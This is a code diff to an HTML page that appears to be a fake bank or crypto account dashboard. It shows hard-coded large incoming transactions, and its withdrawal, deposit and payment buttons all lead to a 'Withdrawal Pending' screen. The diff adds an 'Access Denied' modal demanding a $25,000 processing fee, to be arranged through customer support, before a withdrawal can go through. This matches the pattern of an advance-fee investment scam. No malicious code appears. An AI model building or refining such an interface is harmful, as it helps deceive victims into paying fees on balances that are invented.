@@ -34,29 +34,27 @@
                 </div>
                 
                 <div class="brown-shelf">
-                    <!-- Carousel Dots -->
-                    <div class="carousel-dots" style="display: flex; justify-content: center; gap: 6px; margin-bottom: 16px;">
-                        <div class="dot active" style="width: 6px; height: 6px; background: #fff; border-radius: 50%;"></div>
-                        <div class="dot" style="width: 6px; height: 6px; background: #e4be78; border-radius: 50%; opacity: 0.5;"></div>
-                        <div class="dot" style="width: 6px; height: 6px; background: #e4be78; border-radius: 50%; opacity: 0.5;"></div>
+                    <div style="display: flex; justify-content: center; gap: 6px; margin-bottom: 12px; opacity: 0.6;">
+                        <div style="width: 6px; height: 6px; background: #fff; border-radius: 50%;"></div>
+                        <div style="width: 6px; height: 6px; background: #fff; border-radius: 50%;"></div>
+                        <div style="width: 6px; height: 6px; background: #fff; border-radius: 50%;"></div>
                     </div>
                     
-                    <!-- Unified 5-Button Grid -->
-                    <div class="action-grid" style="display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; padding-bottom: 20px;">
-                        <button onclick="showCryptoMarket()" style="background: #c5a04a; border: none; border-radius: 16px; padding: 12px 2px; color: #000; font-size: 10px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer;">
-                            <span class="action-icon" style="background: rgba(0,0,0,0.12); width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center;">📈</span> Crypto
+                    <div class="action-grid" style="display: grid; grid-template-columns: repeat(5, 1fr); gap: 4px; padding-bottom: 10px;">
+                        <button onclick="showCryptoMarket()" style="background: transparent; border: none; color: #000; font-size: 10px; font-weight: 700; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer;">
+                            <span style="background: rgba(0,0,0,0.1); width: 40px; height: 40px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px;">📈</span> Crypto
                         </button>
-                        <button onclick="showWithdrawalModal()" style="background: #c5a04a; border: none; border-radius: 16px; padding: 12px 2px; color: #000; font-size: 10px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer;">
-                            <span class="action-icon" style="background: rgba(0,0,0,0.12); width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center;">⇄</span> Trans
+                        <button onclick="showWithdrawalModal()" style="background: transparent; border: none; color: #000; font-size: 10px; font-weight: 700; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer;">
+                            <span style="background: rgba(0,0,0,0.1); width: 40px; height: 40px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px;">⇄</span> Trans
                         </button>
-                        <button onclick="showWithdrawalModal()" style="background: #c5a04a; border: none; border-radius: 16px; padding: 12px 2px; color: #000; font-size: 10px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer;">
-                            <span class="action-icon" style="background: rgba(0,0,0,0.12); width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center;">↓</span> Dep
+                        <button onclick="showWithdrawalModal()" style="background: transparent; border: none; color: #000; font-size: 10px; font-weight: 700; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer;">
+                            <span style="background: rgba(0,0,0,0.1); width: 40px; height: 40px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px;">↓</span> Dep
                         </button>
-                        <button onclick="showWithdrawalModal()" style="background: #c5a04a; border: none; border-radius: 16px; padding: 12px 2px; color: #000; font-size: 10px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer;">
-                            <span class="action-icon" style="background: rgba(0,0,0,0.12); width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center;">$</span> Pay
+                        <button onclick="showWithdrawalModal()" style="background: transparent; border: none; color: #000; font-size: 10px; font-weight: 700; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer;">
+                            <span style="background: rgba(0,0,0,0.1); width: 40px; height: 40px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px;">$</span> Pay
                         </button>
-                        <button onclick="showMessageModal()" style="background: #c5a04a; border: none; border-radius: 16px; padding: 12px 2px; color: #000; font-size: 10px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer;">
-                            <span class="action-icon" style="background: rgba(0,0,0,0.12); width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center;">✉</span> Msg
+                        <button onclick="showMessageModal()" style="background: transparent; border: none; color: #000; font-size: 10px; font-weight: 700; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer;">
+                            <span style="background: rgba(0,0,0,0.1); width: 40px; height: 40px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px;">✉</span> Msg
                         </button>
                     </div>
                 </div>
@@ -65,62 +63,114 @@
             <div class="transactions-panel">
                 <div class="panel-header">
                     <h3>Transactions</h3>
-                    <button class="icon-btn" onclick="showWithdrawalModal()">•••</button>
+                    <button class="icon-btn" style="background: none; border: none; font-size: 20px; cursor: pointer;">•••</button>
                 </div>
 
                 <div class="trans-item" onclick="showReceipt('Deposit: Investment', '+$250,000.00', 'Jan 15, 2026')">
-                    <div><strong>Deposit: Investment</strong><div class="trans-date">Jan 15, 2026 • Checking</div></div>
+                    <div>
+                        <strong>Deposit: Investment</strong>
+                        <div class="trans-date">Jan 15, 2026 • Checking</div>
+                    </div>
                     <span class="pos-amt">+$250,000.00</span>
                 </div>
 
                 <div class="trans-item" onclick="showReceipt('Wire Transfer', '+$150,000.00', 'Mar 10, 2024')">
-                    <div><strong>Wire Transfer</strong><div class="trans-date">Mar 10, 2024 • Checking</div></div>
+                    <div>
+                        <strong>Wire Transfer</strong>
+                        <div class="trans-date">Mar 10, 2024 • Checking</div>
+                    </div>
                     <span class="pos-amt">+$150,000.00</span>
                 </div>
 
                 <div class="trans-item" onclick="showReceipt('Corporate Bonus', '+$50,000.00', 'Dec 05, 2022')">
-                    <div><strong>Corporate Bonus</strong><div class="trans-date">Dec 05, 2022 • Checking</div></div>
+                    <div>
+                        <strong>Corporate Bonus</strong>
+                        <div class="trans-date">Dec 05, 2022 • Checking</div>
+                    </div>
                     <span class="pos-amt">+$50,000.00</span>
                 </div>
 
                 <div class="trans-item" onclick="showReceipt('Dividend Payout', '+$12,000.00', 'Jul 20, 2020')">
-                    <div><strong>Dividend Payout</strong><div class="trans-date">Jul 20, 2020 • Checking</div></div>
+                    <div>
+                        <strong>Dividend Payout</strong>
+                        <div class="trans-date">Jul 20, 2020 • Checking</div>
+                    </div>
                     <span class="pos-amt">+$12,000.00</span>
                 </div>
 
                 <div class="trans-item" onclick="showReceipt('Asset Sale', '+$400,000.00', 'Sep 12, 2018')">
-                    <div><strong>Asset Sale</strong><div class="trans-date">Sep 12, 2018 • Checking</div></div>
+                    <div>
+                        <strong>Asset Sale</strong>
+                        <div class="trans-date">Sep 12, 2018 • Checking</div>
+                    </div>
                     <span class="pos-amt">+$400,000.00</span>
                 </div>
 
                 <div class="trans-item" onclick="showReceipt('Wire Transfer (2013)', '+$5,000.00', 'Nov 15, 2013')">
-                    <div><strong>Wire Transfer (2013)</strong><div class="trans-date">Nov 15, 2013 • Checking</div></div>
+                    <div>
+                        <strong>Wire Transfer (2013)</strong>
+                        <div class="trans-date">Nov 15, 2013 • Checking</div>
+                    </div>
                     <span class="pos-amt">+$5,000.00</span>
                 </div>
 
                 <div class="trans-item" onclick="showReceipt('Online Purchase', '-$150.00', 'Jun 20, 2026')">
-                    <div><strong>Online Purchase</strong><div class="trans-date">Jun 20, 2026 • Checking</div></div>
+                    <div>
+                        <strong>Online Purchase</strong>
+                        <div class="trans-date">Jun 20, 2026 • Checking</div>
+                    </div>
                     <span class="neg-amt">-$150.00</span>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Live Crypto Market Modal -->
     <div id="cryptoMarketModal" class="modal">
         <div class="modal-content" style="max-width: 360px; width: 90%; height: auto; padding-bottom: 20px;">
             <h3 style="color: #8b6826; margin-bottom: 15px;">Live Cryptocurrency Market</h3>
             <div class="tradingview-widget-container" style="margin-bottom: 15px;">
                 <div class="tradingview-widget-container__widget"></div>
                 <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-market-overview.js" async>
-                { "colorTheme": "light", "symbols": [ { "s": "BITSTAMP:BTCUSD", "d": "Bitcoin" }, { "s": "BITSTAMP:ETHUSD", "d": "Ethereum" }, { "s": "COINBASE:SOLUSD", "d": "Solana" } ] }
+                {
+                "colorTheme": "light",
+                "dateRange": "12M",
+                "showChart": true,
+                "locale": "en",
+                "largeChartUrl": "",
+                "isTransparent": false,
+                "showSymbolLogo": true,
+                "showFloatingTooltip": false,
+                "width": "100%",
+                "height": "280",
+                "plotLineColorGrowing": "#2962FF",
+                "plotLineColorFalling": "#2962FF",
+                "gridLineColor": "#e9e9ea",
+                "scaleFontColor": "rgba(120, 120, 120, 1)",
+                "belowLineFillColorGrowing": "rgba(41, 98, 255, 0.12)",
+                "belowLineFillColorFalling": "rgba(41, 98, 255, 0.12)",
+                "belowLineFillColorGrowingBottom": "rgba(41, 98, 255, 0)",
+                "belowLineFillColorFallingBottom": "rgba(41, 98, 255, 0)",
+                "symbolActiveColor": "rgba(41, 98, 255, 0.12)",
+                "symbols": [
+                  { "s": "BITSTAMP:BTCUSD", "d": "Bitcoin" },
+                  { "s": "BITSTAMP:ETHUSD", "d": "Ethereum" },
+                  { "s": "COINBASE:SOLUSD", "d": "Solana" }
+                ]
+                }
                 </script>
             </div>
             <button onclick="closeModals()" style="width: 100%; padding: 12px; margin-top: 10px;">Back to Account</button>
         </div>
     </div>
 
-    <!-- Withdrawal Pending Modal -->
+    <div id="restrictionModal" class="modal">
+        <div class="modal-content">
+            <h3>Access Denied</h3>
+            <p>A processing fee of $25,000 is required before this withdrawal request can be completed. Please contact customer support for additional information regarding this requirement.</p>
+            <button onclick="closeModals()">OK</button>
+        </div>
+    </div>
+
     <div id="withdrawalModal" class="modal">
         <div class="modal-content">
             <h3 style="color: #c62828;">Withdrawal Pending</h3>
@@ -129,7 +179,6 @@
         </div>
     </div>
 
-    <!-- Premium Message/Support Modal -->
     <div id="messageModal" class="modal">
         <div class="modal-content" style="background: #111; color: #fff; border: 1px solid #c5a04a; border-radius: 24px; padding: 30px; text-align: center; max-width: 300px; width: 78%; margin: auto; box-shadow: 0 12px 30px rgba(0,0,0,0.6);">
             <h3 style="color: #c5a04a; margin-top: 0;">Support Center</h3>
@@ -139,7 +188,6 @@
         </div>
     </div>
 
-    <!-- Transaction Receipt Modal -->
     <div id="receiptModal" class="modal">
         <div class="modal-content">
             <h3>Transaction Receipt</h3>
